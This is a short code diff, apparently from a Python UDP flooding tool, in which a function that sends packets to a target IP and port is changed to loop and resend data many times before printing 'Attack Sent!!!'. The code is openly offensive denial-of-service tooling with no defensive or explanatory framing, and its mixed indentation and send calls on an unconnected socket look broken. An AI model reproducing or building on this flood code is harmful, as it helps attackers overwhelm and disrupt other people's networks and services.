@@ -101,7 +101,10 @@ def run2():
 		 try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         s.sendto(bytes, (ip,port))
-                        print(i +"Attack Sent!!!")
+                        s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
 		 except:
 			print("[!] Error!!!")
 
